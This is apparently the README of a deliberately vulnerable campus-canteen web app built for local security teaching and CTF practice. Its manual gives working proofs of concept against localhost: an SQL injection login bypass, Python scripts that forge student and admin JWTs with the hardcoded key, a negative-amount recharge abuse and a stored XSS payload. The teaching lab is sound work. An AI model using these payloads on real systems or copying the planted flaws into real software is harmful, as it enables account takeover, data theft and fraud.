# Campus Canteen CTF 教学项目

> 一个 **Go + Vue 3 + MySQL** 的本地 Web 安全教学靶场，题材为“校园餐厅/校园卡系统”。

## 重要说明

- **仅用于本地 / 教学 / CTF 演示环境**
- **不要部署到公网**
- 项目中故意保留以下漏洞：
  - SQL 注入
  - JWT 硬编码密钥 / JWT 伪造
  - 弱口令
  - JWT 登录后的水平越权
  - 充值逻辑漏洞
  - 存储型 XSS
- 后端启动时会自动：
  - 重建演示表结构
  - 重置默认种子数据
- 请**不要把 `campus_ctf` 数据库用于真实数据**

---

## 技术栈

- 后端：Go 1.25 + Gin + MySQL
- 前端：Vue 3 + Vue Router + TypeScript + Vite
- 认证：JWT（故意硬编码密钥 `123456`）
- 运行方式：本地直连 MySQL / Docker Compose（二选一）

## 角色设计

- **学生**：6 个默认账号
- **管理员/教师**：1 个默认后台账号

## 当前漏洞点总览

1. **学生登录 SQL 注入**：`POST /api/student/login` 使用字符串拼接
2. **JWT 硬编码密钥**：后端写死 `123456`
3. **JWT 伪造**：已知密钥后可伪造学生或管理员身份
4. **JWT 登录后的水平越权**：学生 A 的 JWT 可读取学生 B 的资料与消费记录
5. **弱口令**：唯一管理员账号为 `admin / admin123`
6. **充值逻辑漏洞**：银行卡向校园卡转账时，`0.001`、`-1` 之类非法金额也能成功入账
7. **存储型 XSS**：学生留言在管理员后台使用 `v-html` 直接渲染

---

# 一、默认账号与初始数据

## 1. 管理员

| 角色 | 用户名 | 密码 |
| --- | --- | --- |
| 系统管理员 | `admin` | `admin123` |

## 2. 学生

| 用户名 | 密码 |
| --- | --- |
| `student001` | `Meal2026#001` |
| `student002` | `Meal2026#002` |
| `student003` | `Meal2026#003` |
| `student004` | `Meal2026#004` |
| `student005` | `Meal2026#005` |
| `student006` | `Meal2026#006` |

## 3. 默认业务数据

每个学生都带有：

- 学号
- 校园卡号
- 银行卡号
- 校园卡余额
- 银行卡余额
- 手机号
- 宿舍号

系统还预置了：

- 消费记录
- 充值记录
- 学生留言

---

# 二、推荐调试方式：不构建 Docker，直接连接你自己的 MySQL

> 你现在已经单独运行了 MySQL，这一节就是推荐方式。

## 1. 环境要求

- Go `1.25+`
- Node.js `20+`
- npm `11+`
- MySQL `8.x`

可先检查版本：

```powershell
go version
node -v
npm -v
mysql --version
```

## 2. 创建数据库

先登录你自己的 MySQL，然后执行：

```sql
CREATE DATABASE IF NOT EXISTS campus_ctf CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
```

如果你已经有可用账号，也可以直接复用；下面只是示例：

```sql
CREATE USER IF NOT EXISTS 'ctf'@'%' IDENTIFIED BY 'ctf';
GRANT ALL PRIVILEGES ON campus_ctf.* TO 'ctf'@'%';
FLUSH PRIVILEGES;
```

## 3. 说明：当前后端不会自动加载 `.env`

当前项目中的：

- `backend/.env`
- `backend/.env.example`
- `frontend/.env`
- `frontend/.env.example`

主要作为参考模板。实际调试时，建议你直接在终端或 IDE 里设置环境变量。

## 4. 启动后端（PowerShell）

打开终端 1：

```powershell
cd backend
$env:APP_ADDR=":8080"
$env:APP_UPLOAD_DIR="./uploads"
$env:DB_DSN="ctf:ctf@tcp(127.0.0.1:3306)/campus_ctf?charset=utf8mb4&parseTime=True&loc=Local"
go run ./cmd/server
```

### 后端启动时会做什么？

每次启动都会自动执行：

- `EnsureSchema()`
- `SeedDemoData()`

也就是会：

- 删除并重建演示表
- 恢复 6 个学生账号和 1 个管理员账号
- 恢复默认双卡余额、消费记录、充值记录、留言数据

## 5. 启动前端（PowerShell）

打开终端 2：

```powershell
cd frontend
npm install
npm run dev
```

## 6. 启动成功后访问

- 前端：<http://localhost:5173>
- 后端健康检查：<http://127.0.0.1:8080/api/health>

健康检查返回：

```json
{"status":"ok"}
```

## 7. IDE 调试建议

### Go 断点调试

- 调试入口：`backend/cmd/server/main.go`
- 在 Run / Debug Configuration 中手动设置：
  - `APP_ADDR`
  - `APP_UPLOAD_DIR`
  - `DB_DSN`

### Vue 调试

- 工作目录：`frontend`
- 命令：

```powershell
npm run dev
```

---

# 三、Docker 方式（可选）

如果你以后不想复用自己的 MySQL，也可以使用：

```powershell
docker compose up -d --build
```

访问地址仍然是：

- 前端：<http://localhost:5173>
- 后端：<http://127.0.0.1:8080>

但**本项目当前更推荐你直接连你已经单独运行的 MySQL**，调试更方便。

---

# 四、页面与接口对照

## 学生端页面

- `/student/login`：学生登录（SQL 注入）
- `/student`：个人资料 + 消费记录 + 当前 JWT 展示/复制（JWT 越权读取）
- `/student/recharge`：银行卡向校园卡转账（充值逻辑漏洞）
- `/student/messages`：学生留言

## 管理员端页面

- `/admin/login`：后台登录（弱口令）
- `/admin`：后台总览 + 环境重置
- `/admin/students`：学生双卡资料后台
- `/admin/messages`：留言列表（存储型 XSS + 删除留言）

## 核心接口

- `POST /api/student/login`
- `POST /api/admin/login`
- `GET /api/auth/me`
- `POST /api/auth/logout`
- `GET /api/student/profile`
- `GET /api/student/consumptions`
- `POST /api/student/recharge`
- `GET /api/student/recharges`
- `GET /api/student/messages`
- `POST /api/student/messages`
- `GET /api/admin/summary`
- `GET /api/admin/students`
- `GET /api/admin/students/:id`
- `GET /api/admin/messages`
- `DELETE /api/admin/messages/:id`
- `POST /api/admin/reset-demo`

---

# 五、测试准备：如何拿到 JWT

> Windows PowerShell 下建议使用 `curl.exe`，不要混用 PowerShell 的 `curl` 别名。

## 1. 正常学生登录，拿到 JWT

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/student/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"student001\",\"password\":\"Meal2026#001\"}"
```

返回结果中会有：

- `token`
- `user.id`
- `user.role`
- `user.campusCardBalance`
- `user.bankCardBalance`

## 2. 管理员登录，拿到 JWT

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/admin/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin\",\"password\":\"admin123\"}"
```

## 3. 用 JWT 验证当前身份

把 `<TOKEN>` 换成上一步返回的 token：

```powershell
curl.exe http://127.0.0.1:8080/api/auth/me ^
  -H "Authorization: Bearer <TOKEN>"
```

---

# 六、漏洞测试手册（含步骤与 PoC）

## 1. SQL 注入：学生登录接口

### 漏洞点

- 接口：`POST /api/student/login`
- 原因：后端字符串拼接 SQL

### 浏览器操作

打开学生登录页：

- <http://localhost:5173/student/login>

输入：

- 用户名：`student001' OR '1'='1`
- 密码：`anything`

即可绕过正常认证逻辑。

### curl PoC

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/student/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"student001' OR '1'='1\",\"password\":\"x\"}"
```

### 预期现象

- 登录成功
- 返回 JWT
- 返回某个学生身份数据

---

## 2. 弱口令：管理员后台

### 漏洞点

- 账号固定：`admin`
- 密码固定：`admin123`

### 浏览器操作

打开：

- <http://localhost:5173/admin/login>

输入：

- 用户名：`admin`
- 密码：`admin123`

### curl PoC

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/admin/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin\",\"password\":\"admin123\"}"
```

### 预期现象

- 登录成功
- 返回管理员 JWT

---

## 3. JWT 硬编码密钥 / JWT 伪造

### 漏洞点

后端将 JWT 密钥硬编码为：

```text
123456
```

因此只要知道密钥，就可以伪造任意学生或管理员身份。

### 伪造学生 JWT（Python PoC）

先安装 PyJWT：

```powershell
pip install pyjwt
```

然后执行：

```powershell
@'
import jwt
payload = {
    "id": 2,
    "username": "student002",
    "displayName": "李四",
    "role": "student",
    "studentNo": "2024002"
}
print(jwt.encode(payload, "123456", algorithm="HS256"))
'@ | python -
```

将输出的 token 代入：

```powershell
curl.exe http://127.0.0.1:8080/api/auth/me ^
  -H "Authorization: Bearer <FORGED_STUDENT_JWT>"
```

### 伪造管理员 JWT（Python PoC）

```powershell
@'
import jwt
payload = {
    "id": 7,
    "username": "admin",
    "displayName": "食堂系统管理员",
    "role": "admin",
    "studentNo": ""
}
print(jwt.encode(payload, "123456", algorithm="HS256"))
'@ | python -
```

然后访问管理员接口：

```powershell
curl.exe http://127.0.0.1:8080/api/admin/summary ^
  -H "Authorization: Bearer <FORGED_ADMIN_JWT>"
```

### 预期现象

- 伪造学生 token 能访问学生接口
- 伪造管理员 token 能访问后台接口

---

## 4. JWT 登录后的水平越权：伪造 JWT 中的学号后读取其他学生数据

### 漏洞点

虽然现在用了 JWT，但学生端接口已经不再暴露“查询学生 ID”的输入框，后端会**直接信任 JWT 中的 `studentNo` 作为查找学生记录的凭证**。

也就是说：

- 学生 A 正常登录，拿到自己的 JWT
- 因为密钥是 `123456`，攻击者可以重新伪造一个 JWT
- 只要把 token 里的 `studentNo` 改成其他学号，就能查看其他学生资料和消费记录

### 步骤

1. 先用 `student001 / Meal2026#001` 登录，拿到 JWT
2. 伪造一个新的学生 JWT，把 `studentNo` 改成 `2024002`
3. 用这个伪造 JWT 访问学生接口

### 伪造学号的 JWT PoC

```powershell
@'
import jwt
payload = {
    "id": 1,
    "username": "student001",
    "displayName": "董小含",
    "role": "student",
    "studentNo": "2024002"
}
print(jwt.encode(payload, "123456", algorithm="HS256"))
'@ | python -
```

### 个人资料 PoC

```powershell
curl.exe "http://127.0.0.1:8080/api/student/profile" ^
  -H "Authorization: Bearer <FORGED_STUDENT_JWT>"
```

### 消费记录 PoC

```powershell
curl.exe "http://127.0.0.1:8080/api/student/consumptions" ^
  -H "Authorization: Bearer <FORGED_STUDENT_JWT>"
```

### 浏览器操作

1. 登录学生 1
2. 进入：<http://localhost:5173/student>
3. 页面顶部状态卡会直接显示当前 JWT，并提供“复制 JWT”按钮
4. 将本地存储中的 JWT 替换为伪造 token，或者直接用伪造 token 调接口
5. 刷新页面

### 预期现象

- 页面显示 `student002` 的个人资料
- 页面显示 `student002` 的消费记录
- 且包括校园卡号、银行卡号、双卡余额等信息
- 即使前端没有“查询学生 ID”输入框，仍然能仅靠伪造 JWT 中的学号来越权

---

## 5. 充值逻辑漏洞：银行卡向校园卡非法转账

### 业务设定

每个学生有两张卡：

- **银行卡**：真实资金来源
- **校园卡**：校内消费只扣这张卡

正常规则应当是：

- 只允许正整数金额
- 银行卡扣多少，校园卡就加多少

但当前系统的错误逻辑是：

- `abs(amount)` 后再入账
- 小于 `1` 的金额强制按 `1` 入账
- 银行卡仍按原始 `amount` 扣减

### 测试 1：`0.001`

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/student/recharge ^
  -H "Authorization: Bearer <STUDENT001_JWT>" ^
  -H "Content-Type: application/json" ^
  -d "{\"amount\":0.001}"
```

### 预期现象

- `creditedAmount = 1`
- 校园卡至少 +1 元
- 银行卡只减少 `0.001`

### 测试 2：`-1`

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/student/recharge ^
  -H "Authorization: Bearer <STUDENT001_JWT>" ^
  -H "Content-Type: application/json" ^
  -d "{\"amount\":-1}"
```

### 预期现象

- `creditedAmount = 1`
- 校园卡 +1
- 银行卡因为 `-(-1)`，反而也 +1

### 浏览器操作

1. 登录任意学生
2. 打开：<http://localhost:5173/student/recharge>
3. 观察页面上的：
   - 校园卡号 / 校园卡余额
   - 银行卡号 / 银行卡余额
4. 输入：
   - `0.001`
   - 或 `-1`
5. 点击提交

### 页面效果

- 前端会同时显示两张卡余额变化
- 下方充值流水会记录：
  - 原始金额 `rawAmount`
  - 实际入账金额 `creditedAmount`

---

## 6. 存储型 XSS：学生留言 -> 管理员后台触发

### 漏洞点

管理员后台留言列表直接使用 `v-html` 渲染学生留言内容。

### XSS Payload 示例

```html
<img src=x onerror="alert('stored xss by student')">
```

### 学生端提交 PoC

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/student/messages ^
  -H "Authorization: Bearer <STUDENT001_JWT>" ^
  -H "Content-Type: application/json" ^
  -d "{\"content\":\"<img src=x onerror=\\\"alert('stored xss by student')\\\">\"}"
```

### 浏览器步骤

1. 学生登录
2. 打开：<http://localhost:5173/student/messages>
3. 提交上面的 payload
4. 管理员登录
5. 打开：<http://localhost:5173/admin/messages>

### 预期现象

- 管理员后台页面弹窗
- 说明学生留言已在管理员端被执行

---

## 7. 管理员删除留言

### 功能点

管理员可删除学生留言，用于演示后台管理能力，也便于清理 XSS payload。

### 接口 PoC

例如删除 ID 为 3 的留言：

```powershell
curl.exe -X DELETE http://127.0.0.1:8080/api/admin/messages/3 ^
  -H "Authorization: Bearer <ADMIN_JWT>"
```

### 浏览器步骤

1. 管理员进入：<http://localhost:5173/admin/messages>
2. 找到对应留言
3. 点击“删除留言”

### 预期现象

- 当前留言从列表消失
- 若该留言是 XSS payload，可用于恢复后台页面演示环境

---

# 七、常用测试命令汇总

## 1. 重置演示环境

```powershell
curl.exe -X POST http://127.0.0.1:8080/api/admin/reset-demo ^
  -H "Authorization: Bearer <ADMIN_JWT>"
```

## 2. 查看管理员后台摘要

```powershell
curl.exe http://127.0.0.1:8080/api/admin/summary ^
  -H "Authorization: Bearer <ADMIN_JWT>"
```

## 3. 查看所有学生资料

```powershell
curl.exe http://127.0.0.1:8080/api/admin/students ^
  -H "Authorization: Bearer <ADMIN_JWT>"
```

## 4. 查看某个学生详情

```powershell
curl.exe http://127.0.0.1:8080/api/admin/students/2 ^
  -H "Authorization: Bearer <ADMIN_JWT>"
```

---

# 八、教学讲解建议

如果你拿这个系统做课堂演示，可以按下面顺序讲：

1. **正常业务认知**
   - 学生登录
   - 查看双卡余额
   - 银行卡向校园卡转账
   - 学生留言
2. **认证漏洞**
   - SQL 注入登录
   - 弱口令登录
   - JWT 密钥硬编码
   - JWT 伪造
3. **授权漏洞**
   - 学生 A 的 JWT 越权查看学生 B
4. **业务逻辑漏洞**
   - `0.001` / `-1` 非法充值
5. **前端渲染漏洞**
   - 学生留言 -> 管理员后台触发 XSS
6. **后台运维动作**
   - 管理员删除恶意留言
   - 管理员重置演示环境

---

# 九、补充说明

- 当前 `logout` 为无状态 JWT 退出，只清理前端本地 token，不做服务端黑名单。
- 当前 JWT 密钥故意硬编码在后端，**这是教学需要，不是正确做法**。
- 当前学生资料接口保留 `id` 参数且缺少 ownership 校验，**这是故意保留的越权点**。
- 当前后台留言列表故意使用不安全渲染，**这是为了演示存储型 XSS**。

---

# 十、启动后快速自检

## 后端

```powershell
curl.exe http://127.0.0.1:8080/api/health
```

## 前端

浏览器访问：

- <http://localhost:5173>

如果首页能正常跳到学生登录页，说明前端基本正常。
